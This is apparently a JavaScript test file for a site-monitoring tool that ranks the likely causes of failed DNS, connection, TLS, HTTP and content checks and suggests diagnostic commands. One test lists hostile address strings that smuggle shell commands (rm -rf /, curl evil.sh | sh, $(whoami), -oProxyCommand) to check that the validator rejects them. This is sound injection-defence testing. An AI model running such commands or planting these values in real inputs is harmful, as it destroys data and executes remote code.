// Run with: npm test
// A failed check as an investigation: causes in order of likelihood with the evidence behind each, and checks in order,
// with commands only when the address is safe to put in one.

import test from 'node:test';
import assert from 'node:assert/strict';
import { diagnoseDetailed, targetOf } from '../utils/diagnosisDetail.js';
import { diagnose } from '../utils/diagnosis.js';

const site = { url: 'https://shop.example.com', type: 'website' };
const commands = (d) => d.checks.filter((c) => c.kind === 'command').map((c) => c.command);
const top = (d) => d.causes[0];
const evidenceText = (d) => d.causes.flatMap((c) => c.evidence).join(' | ');

// ── the address ──

test('a plain host name, with its port and scheme, is a safe target', () => {
    assert.deepEqual(targetOf('https://shop.example.com/path?x=1'), { host: 'shop.example.com', port: null, https: true, origin: 'https://shop.example.com' });
    assert.deepEqual(targetOf('http://example.com:8080', 'website'), { host: 'example.com', port: 8080, https: false, origin: 'http://example.com:8080' });
    assert.deepEqual(targetOf('example.com'), { host: 'example.com', port: null, https: true, origin: 'https://example.com' });
    assert.deepEqual(targetOf('db.internal.example.com:5432', 'database'), { host: 'db.internal.example.com', port: 5432, https: false, origin: null });
    assert.equal(targetOf('http://93.184.216.34/').host, '93.184.216.34');
    assert.equal(targetOf('http://[2606:4700::1111]:8080/').origin, 'http://[2606:4700::1111]:8080');
});

test('anything that could be more than a host name is not a target', () => {
    const hostile = [
        'example.com; rm -rf /', 'example.com && curl evil.sh | sh', '$(whoami).example.com', '`id`.example.com', 'ex ample.com',
        "evil.com'|sh", 'https://exa mple.com', '-oProxyCommand=x.example.com', 'host\nname.com', 'a'.repeat(300), '', null, undefined, 'https://', 'example.com:99999'
    ];
    for (const url of hostile) assert.equal(targetOf(url), null, String(url));
});

test('a hostile address never becomes a command, and the steps stay as advice', () => {
    const d = diagnoseDetailed({ kind: 'dns', failedPhase: 'dns', url: 'example.com; rm -rf /', type: 'website' });
    assert.deepEqual(commands(d), []);
    assert.ok(d.checks.length >= 3 && d.checks.every((c) => c.kind === 'manual'));
    assert.ok(!JSON.stringify(d).includes('rm -rf'));
});

// ── the plain version is untouched ──

test('title, cause and action are exactly what the one-line diagnosis says', () => {
    const cases = [
        { kind: 'dns', failedPhase: 'dns' },
        { kind: 'refused', failedPhase: 'connect' },
        { kind: 'tls', failedPhase: 'tls', error: 'certificate has expired' },
        { kind: 'http', failedPhase: 'response', statusCode: 502 },
        { kind: 'content', failedPhase: 'content' }
    ];
    for (const failure of cases) {
        const { title, cause, action } = diagnoseDetailed({ ...failure, ...site });
        assert.deepEqual({ title, cause, action }, diagnose(failure), failure.kind);
    }
});

test('nothing to say is nothing, and an unknown step still gives the plain version with no extras', () => {
    assert.equal(diagnoseDetailed({}), null);
    assert.equal(diagnoseDetailed(), null);
    assert.equal(diagnoseDetailed({ kind: 'other', failedPhase: 'dns' }), null);
    const plain = diagnoseDetailed({ kind: 'timeout', failedPhase: null, ...site });
    assert.equal(plain.title, diagnose({ kind: 'timeout' }).title);
    assert.deepEqual([plain.causes, plain.checks, plain.failedPhase], [[], [], null]);
});

// ── by step ──

test('a name that never resolved points at the DNS provider, and one that said "not found" at the record', () => {
    const slow = diagnoseDetailed({ kind: 'timeout', failedPhase: 'dns', timings: { dns: 9800 }, ...site });
    assert.match(top(slow).text, /DNS provider is slow/);
    assert.match(top(slow).evidence[0], /9,800 ms/);

    const missing = diagnoseDetailed({ kind: 'dns', failedPhase: 'dns', timings: { dns: 45 }, ...site });
    assert.match(top(missing).text, /no DNS record/);
    assert.match(top(missing).evidence[0], /"not found" after 45 ms/);
    assert.ok(commands(missing).includes('dig +short shop.example.com'));
});

test('a refused connection points at a service that is not listening, a timeout at a firewall', () => {
    const refused = diagnoseDetailed({ kind: 'refused', failedPhase: 'connect', timings: { connect: 3 }, evidence: { address: '203.0.113.7' }, url: 'http://shop.example.com:8080', type: 'website' });
    assert.match(top(refused).text, /not running or not listening/);
    assert.deepEqual(top(refused).evidence, ['Refused after 3 ms', 'Resolved to 203.0.113.7']);
    assert.ok(commands(refused).includes('nc -vz shop.example.com 8080'));
    assert.ok(commands(refused).includes("ss -ltn | grep ':8080 '"));

    const timeout = diagnoseDetailed({ kind: 'timeout', failedPhase: 'connect', timings: { connect: 10000 }, evidence: { address: '203.0.113.7' }, ...site });
    assert.match(top(timeout).text, /firewall or security group is dropping/);
    assert.match(top(timeout).evidence[0], /No connection after 10,000 ms/);

    const unreachable = diagnoseDetailed({ kind: 'unreachable', failedPhase: 'connect', ...site });
    assert.match(top(unreachable).text, /offline, or has no network route/);
});

test('a certificate problem is told apart by what the handshake said', () => {
    const cases = [
        ['certificate has expired', /has expired/],
        ['Hostname/IP does not match certificate\'s altnames', /different name/],
        ['self-signed certificate', /self-signed/],
        ['unable to verify the first certificate', /chain is incomplete/],
        ['write EPROTO wrong version number', /not speaking HTTPS/]
    ];
    for (const [error, expected] of cases) {
        const d = diagnoseDetailed({ kind: 'tls', failedPhase: 'tls', error, timings: { tls: 40 }, ...site });
        assert.match(top(d).text, expected, error);
    }
    const d = diagnoseDetailed({ kind: 'tls', failedPhase: 'tls', error: 'certificate has expired', ...site });
    assert.ok(commands(d)[0].startsWith('openssl s_client -connect shop.example.com:443 -servername shop.example.com'));
});

test('a 502 is read with who answered, and a Cloudflare error with the Cloudflare headers', () => {
    const d = diagnoseDetailed({ kind: 'http', failedPhase: 'response', statusCode: 502, evidence: { statusCode: 502, headers: { server: 'nginx/1.24' } }, ...site });
    assert.match(top(d).text, /application behind the web server is down/);
    assert.deepEqual(top(d).evidence, ['Status 502', 'Answered by nginx/1.24']);

    const cf = diagnoseDetailed({ kind: 'http', failedPhase: 'response', statusCode: 522, evidence: { statusCode: 522, headers: { server: 'cloudflare', 'cf-ray': '8a1-LHR' } }, ...site });
    assert.match(top(cf).text, /Cloudflare timed out connecting/);
    assert.match(evidenceText(cf), /cf-ray 8a1-LHR/);

    const notCf = diagnoseDetailed({ kind: 'http', failedPhase: 'response', statusCode: 522, evidence: { statusCode: 522, headers: {} }, ...site });
    assert.ok(!/Cloudflare/.test(top(notCf).text), 'a 522 with nothing from Cloudflare is just a server error');
});

test('503 and 504 cite what they measured and what the server said', () => {
    const busy = diagnoseDetailed({ kind: 'http', failedPhase: 'response', statusCode: 503, evidence: { headers: { 'retry-after': '30' } }, ...site });
    assert.match(evidenceText(busy), /Retry-After: 30/);

    const slow = diagnoseDetailed({ kind: 'http', failedPhase: 'response', statusCode: 504, timings: { ttfb: 30000 }, ...site });
    assert.match(top(slow).text, /took too long to answer the proxy/);
    assert.match(evidenceText(slow), /30,000 ms/);
});

test('a refused check is a blocked probe when the answer is 401, 403 or 429, and says where to allow it', () => {
    const d = diagnoseDetailed({ kind: 'http', failedPhase: 'response', statusCode: 403, evidence: { headers: { 'cf-ray': 'x' } }, ...site });
    assert.match(top(d).text, /firewall, bot filter or login wall/);
    assert.match(evidenceText(d), /came through Cloudflare/);
    assert.ok(d.checks.some((c) => /add it to the status codes/.test(c.step)));
    assert.match(top(diagnoseDetailed({ kind: 'http', failedPhase: 'response', statusCode: 429, ...site })).text, /rate limit/);
});

test('a connection that hung or was cut says so, and what to look at', () => {
    const hung = diagnoseDetailed({ kind: 'no_response', failedPhase: 'response', timings: { ttfb: 10000 }, ...site });
    assert.match(top(hung).text, /hung/);
    assert.match(top(hung).evidence[0], /waited 10,000 ms/);
    const reset = diagnoseDetailed({ kind: 'reset', failedPhase: 'response', ...site });
    assert.match(top(reset).text, /crashed while handling|crashed/);
});

// ── what the page said ──

test('a page that says "maintenance" becomes the first cause, with the words quoted', () => {
    const d = diagnoseDetailed({ kind: 'http', failedPhase: 'response', statusCode: 503, evidence: { snippet: '<html><body><h1>Down for maintenance</h1><p>Back soon.</p></body></html>' }, ...site });
    assert.match(top(d).text, /maintenance page/);
    assert.equal(top(d).confidence, 'high');
    assert.match(top(d).evidence[0], /The page says: “.*maintenance/);
    assert.ok(!top(d).evidence[0].includes('<h1>'), 'the words, not the tags');
});

test('other pages are recognised: a database error, a bot filter, a default page', () => {
    const page = (snippet) => diagnoseDetailed({ kind: 'http', failedPhase: 'response', statusCode: 500, evidence: { snippet }, ...site });
    assert.match(top(page('Error establishing a database connection')).text, /database/);
    assert.match(top(page('Attention Required! | Cloudflare — You have been blocked')).text, /bot filter/);
    assert.ok(page('<h1>Welcome to nginx!</h1>').causes.some((c) => /default page/.test(c.text)), 'medium, so below a plain 500');
    assert.ok(!/maintenance|database|bot filter|default page/.test(top(page('plain old error')).text));
});

test('a script or style block is not read as the page', () => {
    const d = diagnoseDetailed({ kind: 'http', failedPhase: 'response', statusCode: 500, evidence: { snippet: '<script>var m = "maintenance";</script><p>oops</p>' }, ...site });
    assert.ok(!/maintenance/.test(top(d).text));
});

test('a page that failed the keyword check says what the page showed, and the check is advice, never a command with the keyword', () => {
    const d = diagnoseDetailed({ kind: 'content', failedPhase: 'content', evidence: { statusCode: 200, snippet: '<h1>Back soon</h1>' }, ...site });
    assert.match(top(d).text, /maintenance page/);
    assert.ok(d.causes.some((c) => /normal status/.test(c.text)));
    assert.deepEqual(commands(d), ['curl -sS https://shop.example.com']);
});

// ── the shape of the answer ──

test('causes are most likely first, never repeat, and are capped; checks are capped and never repeat', () => {
    for (const failure of [
        { kind: 'timeout', failedPhase: 'dns', timings: { dns: 9000 } },
        { kind: 'refused', failedPhase: 'connect' },
        { kind: 'tls', failedPhase: 'tls', error: 'x' },
        { kind: 'http', failedPhase: 'response', statusCode: 503, evidence: { snippet: 'maintenance database error' } },
        { kind: 'content', failedPhase: 'content', evidence: { snippet: 'back soon' } }
    ]) {
        const d = diagnoseDetailed({ ...failure, ...site });
        const rank = { high: 0, medium: 1, low: 2 };
        assert.ok(d.causes.length >= 1 && d.causes.length <= 4, `${failure.kind} causes ${d.causes.length}`);
        assert.ok(d.checks.length >= 1 && d.checks.length <= 6, `${failure.kind} checks ${d.checks.length}`);
        assert.deepEqual(d.causes.map((c) => rank[c.confidence]), d.causes.map((c) => rank[c.confidence]).sort((a, b) => a - b), 'ranked');
        assert.equal(new Set(d.causes.map((c) => c.text)).size, d.causes.length);
        assert.equal(new Set(d.checks.map((c) => c.command || c.step)).size, d.checks.length);
        for (const c of d.causes) assert.ok(c.evidence.length <= 3 && c.evidence.every((e) => typeof e === 'string' && e));
        for (const c of d.checks) assert.ok(c.kind === 'manual' ? c.command === undefined : typeof c.command === 'string');
    }
});

test('no cause cites a number that was not measured', () => {
    const d = diagnoseDetailed({ kind: 'refused', failedPhase: 'connect', ...site });
    assert.deepEqual(top(d).evidence, ['The connection was refused']);
    assert.ok(!/\d+ ms/.test(evidenceText(d)));
});
